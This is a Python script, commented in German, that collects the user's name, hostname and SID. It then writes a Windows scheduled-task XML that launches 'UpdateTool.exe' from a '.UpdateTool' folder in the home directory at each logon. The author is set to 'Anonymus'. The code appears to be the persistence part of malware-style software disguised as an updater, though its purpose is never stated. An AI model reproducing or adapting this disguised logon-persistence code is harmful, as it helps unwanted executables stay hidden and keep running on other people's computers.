import os
import subprocess
import socket
#temppath zu python holen
tmp = os.environ.get('TMP')
# homepath zu python holen
home = os.environ.get('homepath')

# username zu python holen
user = os.environ.get('username')

newpath_home = home + r'\.UpdateTool'
newpath_tmp = tmp + r'\UpdateTool'

#SID zu python
raw_mysid = subprocess.Popen("wmic useraccount where name=\"%username%\" get sid", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
(sid_out, sid_err) = raw_mysid.communicate()
mysid = str(sid_out[48:91], 'utf-8')


#raw_mysid[47:90]

#hostname zu python holen (etwas anders da hostname keine var)
host = socket.gethostname()
xmlname = "UpdateTool.xml"
downloadname = "UpdateTool.exe"
hostuser = host + '\\' + user
#raw_host = subprocess.Popen("hostname", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
#(host_out, host_err) = raw_mysid.communicate()
#host = raw_host[0:len(host_out)-1] # wird benötigt da in cmd nach string \n

# lösche falls nötig alte xml datei
if os.path.exists(newpath_tmp + '\\' + xmlname):
    os.remove(newpath_tmp + '\\' + xmlname)


# erstelle xml datei
os.system(r'cmd /c "echo ^<?xml version="1.0" encoding="UTF-16"?^> >> ' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo ^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^> >> ' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo   ^<RegistrationInfo^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<Date^>2021-04-28T07:52:50.2538139^</Date^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<Author^>Anonymus^</Author^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<URI^>\UpdateTool^</URI^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo   ^</RegistrationInfo^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo   ^<Triggers^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<LogonTrigger^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo       ^<Enabled^>true^</Enabled^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo       ^<UserId^>' + hostuser + '^</UserId^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^</LogonTrigger^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo   ^</Triggers^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo   ^<Principals^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<Principal id="Author"^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo       ^<UserId^>' + mysid + '^</UserId^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo       ^<LogonType^>InteractiveToken^</LogonType^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo       ^<RunLevel^>LeastPrivilege^</RunLevel^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^</Principal^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo   ^</Principals^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo   ^<Settings^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<DisallowStartIfOnBatteries^>true^</DisallowStartIfOnBatteries^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<AllowHardTerminate^>true^</AllowHardTerminate^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<StartWhenAvailable^>false^</StartWhenAvailable^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<IdleSettings^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo       ^<Duration^>PT10M^</Duration^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo       ^<WaitTimeout^>PT1H^</WaitTimeout^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo       ^<StopOnIdleEnd^>true^</StopOnIdleEnd^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo       ^<RestartOnIdle^>false^</RestartOnIdle^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^</IdleSettings^> >>'  + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<AllowStartOnDemand^>true^</AllowStartOnDemand^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<Enabled^>true^</Enabled^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<Hidden^>false^</Hidden^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<WakeToRun^>false^</WakeToRun^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<ExecutionTimeLimit^>PT72H^</ExecutionTimeLimit^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<Priority^>7^</Priority^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo   ^</Settings^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo   ^<Actions Context="Author"^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^<Exec^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo       ^<Command^>' + r'C:' + newpath_home + '\\' + downloadname + '^</Command^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo     ^</Exec^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo   ^</Actions^> >>' + newpath_tmp + '\\' + xmlname + ' & '
+ r'echo ^</Task^> >>' + newpath_tmp + '\\' + xmlname
+ '"')